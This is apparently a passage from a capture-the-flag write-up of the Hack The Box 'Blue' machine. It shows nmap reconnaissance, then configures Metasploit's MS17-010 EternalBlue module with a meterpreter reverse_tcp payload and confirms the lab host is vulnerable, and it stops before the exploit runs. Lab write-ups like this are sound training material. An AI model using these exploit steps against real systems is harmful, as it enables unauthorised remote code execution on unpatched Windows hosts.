</span></span></code></pre></div><h2 id=information-gathering><strong>INFORMATION-GATHERING</strong><a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>As usual, we start out by a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat connection-test.txt 
</span></span><span class=line><span class=cl>PING 10.129.174.73 <span class=o>(</span>10.129.174.73<span class=o>)</span> 56<span class=o>(</span>124<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.174.73: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>4.78 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.174.73: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>3.46 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.174.73: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>3.29 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.174.73: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>3.08 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.174.73 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3004ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 3.075/3.651/4.778/0.664 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>followed by the <strong>usual</strong>(version, default scripts, top-ports) <em><strong>tcp</strong></em> scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>nmap -sV -sC -on nmap-service-defscripts-topports-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sV -sC -on nmap-service-defscripts-topports-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-06-03 09:53 BST
</span></span><span class=line><span class=cl>Failed to resolve <span class=s2>&#34;nmap-service-defscripts-topports-scan&#34;</span>.
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.174.73
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.068s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>991</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49155/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49156/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49157/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: HARIS-PC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -19m57s, deviation: 34m37s, median: 0s
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> <span class=o>(</span>Windows <span class=m>7</span> Professional 6.1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: haris-PC
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: HARIS-PC<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Workgroup: WORKGROUP<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2023-06-03T09:54:40+01:00
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   210: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-06-03T08:54:41
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2023-06-03T08:32:42
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 68.93 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>A couple of ports are reported <strong>open</strong>. One thing clearly <strong>stands out</strong> though:</p><ul><li>445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</li></ul><p>or put simply, <em><strong>smb</strong></em> running on a quite <strong>old os</strong>.</p><p>Doing a quick <strong>internet search</strong> for it&rsquo;s reported <strong>vulnerabilities</strong> lands us with - <strong>MS17-010 EternalBlue</strong> - which is <strong>the</strong> famous <strong>EternalBlue</strong> exploit. The same <strong>exploit</strong> that was used by the <strong>WannaCry</strong> ransomware a couple of years back&mldr; and exploits <strong>CVE-2017-0144</strong>.</p><p>Since there is already an <strong>exploit</strong> written for it in <strong>metasploit</strong>, so we simply continue from there on.</p><h2 id=exploitation><strong>EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Firing up <strong>metasploit</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>msfconsole -q
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.20<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ysgugzuhsh<span class=o>]</span>─<span class=o>[</span>~/blue/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ msfconsole -q
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>and searching for the aforementioned <strong>exploit</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>search ms17-010 eternalblue
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; search ms17-010 eternalblue
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                      Disclosure Date  Rank     Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                      ---------------  ----     -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class=line><span class=cl>   <span class=m>1</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class=line><span class=cl>   <span class=m>2</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class=line><span class=cl>   <span class=m>3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
</span></span><span class=line><span class=cl>   <span class=m>4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 4, use <span class=m>4</span> or use exploit/windows/smb/smb_doublepulsar_rce
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>provides us with some options. The one we will be using here is the <strong>most common</strong> one for <strong>EternalBlue</strong>, which is available at - <em>exploit/windows/smb/ms17_010_eternalblue</em> -. <strong>Selecting</strong> it,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>use <span class=m>0</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; use <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; 
</span></span><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span></code></pre></div><p>and <strong>querying</strong> the module for <strong>information</strong> helps us verify, that the <strong>exploit</strong> is indeed appropriate for our current case.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>info
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; info
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class=line><span class=cl>     Module: exploit/windows/smb/ms17_010_eternalblue
</span></span><span class=line><span class=cl>   Platform: Windows
</span></span><span class=line><span class=cl>       Arch: x64
</span></span><span class=line><span class=cl> Privileged: Yes
</span></span><span class=line><span class=cl>    License: Metasploit Framework License <span class=o>(</span>BSD<span class=o>)</span>
</span></span><span class=line><span class=cl>       Rank: Average
</span></span><span class=line><span class=cl>  Disclosed: 2017-03-14
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provided by:
</span></span><span class=line><span class=cl>  Equation Group
</span></span><span class=line><span class=cl>  Shadow Brokers
</span></span><span class=line><span class=cl>  sleepya
</span></span><span class=line><span class=cl>  Sean Dillon &lt;sean.dillon@risksense.com&gt;
</span></span><span class=line><span class=cl>  Dylan Davis &lt;dylan.davis@risksense.com&gt;
</span></span><span class=line><span class=cl>  thelightcosine
</span></span><span class=line><span class=cl>  wvu &lt;wvu@metasploit.com&gt;
</span></span><span class=line><span class=cl>  agalway-r7
</span></span><span class=line><span class=cl>  cdelafuente-r7
</span></span><span class=line><span class=cl>  cdelafuente-r7
</span></span><span class=line><span class=cl>  agalway-r7
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Available targets:
</span></span><span class=line><span class=cl>      Id  Name
</span></span><span class=line><span class=cl>      --  ----
</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt;  <span class=m>0</span>   Automatic Target
</span></span><span class=line><span class=cl>      <span class=m>1</span>   Windows <span class=m>7</span>
</span></span><span class=line><span class=cl>      <span class=m>2</span>   Windows Embedded Standard <span class=m>7</span>
</span></span><span class=line><span class=cl>      <span class=m>3</span>   Windows Server <span class=m>2008</span> R2
</span></span><span class=line><span class=cl>      <span class=m>4</span>   Windows <span class=m>8</span>
</span></span><span class=line><span class=cl>      <span class=m>5</span>   Windows 8.1
</span></span><span class=line><span class=cl>      <span class=m>6</span>   Windows Server <span class=m>2012</span>
</span></span><span class=line><span class=cl>      <span class=m>7</span>   Windows <span class=m>10</span> Pro
</span></span><span class=line><span class=cl>      <span class=m>8</span>   Windows <span class=m>10</span> Enterprise Evaluation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Check supported:
</span></span><span class=line><span class=cl>  Yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Basic options:
</span></span><span class=line><span class=cl>  Name           Current Setting  Required  Description
</span></span><span class=line><span class=cl>  ----           ---------------  --------  -----------
</span></span><span class=line><span class=cl>  RHOSTS                          yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.
</span></span><span class=line><span class=cl>                                            com/docs/using-metasploit/basics/using-metasploi
</span></span><span class=line><span class=cl>                                            t.html
</span></span><span class=line><span class=cl>  RPORT          <span class=m>445</span>              yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>  SMBDomain                       no        <span class=o>(</span>Optional<span class=o>)</span> The Windows domain to use <span class=k>for</span> authent
</span></span><span class=line><span class=cl>                                            ication. Only affects Windows Server <span class=m>2008</span> R2, Wi
</span></span><span class=line><span class=cl>                                            ndows 7, Windows Embedded Standard <span class=m>7</span> target mach
</span></span><span class=line><span class=cl>                                            ines.
</span></span><span class=line><span class=cl>  SMBPass                         no        <span class=o>(</span>Optional<span class=o>)</span> The password <span class=k>for</span> the specified userna
</span></span><span class=line><span class=cl>                                            me
</span></span><span class=line><span class=cl>  SMBUser                         no        <span class=o>(</span>Optional<span class=o>)</span> The username to authenticate as
</span></span><span class=line><span class=cl>  VERIFY_ARCH    <span class=nb>true</span>             yes       Check <span class=k>if</span> remote architecture matches exploit Tar
</span></span><span class=line><span class=cl>                                            get. Only affects Windows Server <span class=m>2008</span> R2, Window
</span></span><span class=line><span class=cl>                                            s 7, Windows Embedded Standard <span class=m>7</span> target machines
</span></span><span class=line><span class=cl>                                            .
</span></span><span class=line><span class=cl>  VERIFY_TARGET  <span class=nb>true</span>             yes       Check <span class=k>if</span> remote OS matches exploit Target. Only
</span></span><span class=line><span class=cl>                                            affects Windows Server <span class=m>2008</span> R2, Windows 7, Windo
</span></span><span class=line><span class=cl>                                            ws Embedded Standard <span class=m>7</span> target machines.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload information:
</span></span><span class=line><span class=cl>  Space: <span class=m>2000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Description:
</span></span><span class=line><span class=cl>  This module is a port of the Equation Group ETERNALBLUE exploit, 
</span></span><span class=line><span class=cl>  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
</span></span><span class=line><span class=cl>  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
</span></span><span class=line><span class=cl>  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
</span></span><span class=line><span class=cl>  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
</span></span><span class=line><span class=cl>  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
</span></span><span class=line><span class=cl>  Actual RIP hijack is later completed in 
</span></span><span class=line><span class=cl>  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
</span></span><span class=line><span class=cl>  not trigger 100% of the time, and should be run continuously <span class=k>until</span> 
</span></span><span class=line><span class=cl>  triggered. It seems like the pool will get hot streaks and need a 
</span></span><span class=line><span class=cl>  cool down period before the shells rain in again. The module will 
</span></span><span class=line><span class=cl>  attempt to use Anonymous login, by default, to authenticate to 
</span></span><span class=line><span class=cl>  perform the exploit. If the user supplies credentials in the 
</span></span><span class=line><span class=cl>  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
</span></span><span class=line><span class=cl>  On some systems, this module may cause system instability and 
</span></span><span class=line><span class=cl>  crashes, such as a BSOD or a reboot. This may be more likely with 
</span></span><span class=line><span class=cl>  some payloads.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>References:
</span></span><span class=line><span class=cl>  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
</span></span><span class=line><span class=cl>  https://github.com/RiskSense-Ops/MS17-010
</span></span><span class=line><span class=cl>  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
</span></span><span class=line><span class=cl>  https://www.exploit-db.com/exploits/42030
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Also known as:
</span></span><span class=line><span class=cl>  ETERNALBLUE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Great, since it fits, all that&rsquo;s left is to properly <strong>configure</strong> it and then <strong>run</strong> it. <strong>Listing</strong> the module&rsquo;s <strong>options</strong> should help us with the <strong>configuration</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/smb/ms17_010_eternalblue<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name           Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----           ---------------  --------  -----------
</span></span><span class=line><span class=cl>   RHOSTS                          yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit
</span></span><span class=line><span class=cl>                                             .com/docs/using-metasploit/basics/using-metaspl
</span></span><span class=line><span class=cl>                                             oit.html
</span></span><span class=line><span class=cl>   RPORT          <span class=m>445</span>              yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SMBDomain                       no        <span class=o>(</span>Optional<span class=o>)</span> The Windows domain to use <span class=k>for</span> authen
</span></span><span class=line><span class=cl>                                             tication. Only affects Windows Server <span class=m>2008</span> R2,
</span></span><span class=line><span class=cl>                                             Windows 7, Windows Embedded Standard <span class=m>7</span> target m
</span></span><span class=line><span class=cl>                                             achines.
</span></span><span class=line><span class=cl>   SMBPass                         no        <span class=o>(</span>Optional<span class=o>)</span> The password <span class=k>for</span> the specified usern
</span></span><span class=line><span class=cl>                                             ame
</span></span><span class=line><span class=cl>   SMBUser                         no        <span class=o>(</span>Optional<span class=o>)</span> The username to authenticate as
</span></span><span class=line><span class=cl>   VERIFY_ARCH    <span class=nb>true</span>             yes       Check <span class=k>if</span> remote architecture matches exploit Ta
</span></span><span class=line><span class=cl>                                             rget. Only affects Windows Server <span class=m>2008</span> R2, Wind
</span></span><span class=line><span class=cl>                                             ows 7, Windows Embedded Standard <span class=m>7</span> target machi
</span></span><span class=line><span class=cl>                                             nes.
</span></span><span class=line><span class=cl>   VERIFY_TARGET  <span class=nb>true</span>             yes       Check <span class=k>if</span> remote OS matches exploit Target. Only
</span></span><span class=line><span class=cl>                                              affects Windows Server <span class=m>2008</span> R2, Windows 7, Win
</span></span><span class=line><span class=cl>                                             dows Embedded Standard <span class=m>7</span> target machines.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
</span></span><span class=line><span class=cl>   EXITFUNC  thread           yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process,
</span></span><span class=line><span class=cl>                                        none<span class=o>)</span>
</span></span><span class=line><span class=cl>   LHOST     161.35.38.166    yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   <span class=m>0</span>   Automatic Target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Looking at the <strong>default configuration</strong>, we can leave almost all the <strong>settings untouched</strong>, except of course, the <strong>target</strong> and <strong>local</strong> <strong>hosts</strong> settings.</p><p>Now, we could of course specify our <strong>target</strong> host&rsquo;s <strong>OS</strong> too, setting it to - <em>OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</em> - which was reported earlier during <strong>port scanning</strong>, but the module ships with automatic architecture and os discovery, so why bother.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> rhosts <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> lhost tun0
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; <span class=nb>set</span> rhosts 10.129.174.73
</span></span><span class=line><span class=cl><span class=nv>rhosts</span> <span class=o>=</span>&gt; 10.129.174.73
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; <span class=nb>set</span> lhost tun0
</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.10.14.20
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Looks like everything is properly set up, so let&rsquo;s run a quick <strong>check</strong> and see if our <strong>target</strong> is <strong>vulnerable</strong> or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># msf command</span>
</span></span><span class=line><span class=cl>check
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt; check
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445     - Host is likely VULNERABLE to MS17-010! - Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.174.73:445     - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.174.73:445 - The target is vulnerable.
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt;&gt;
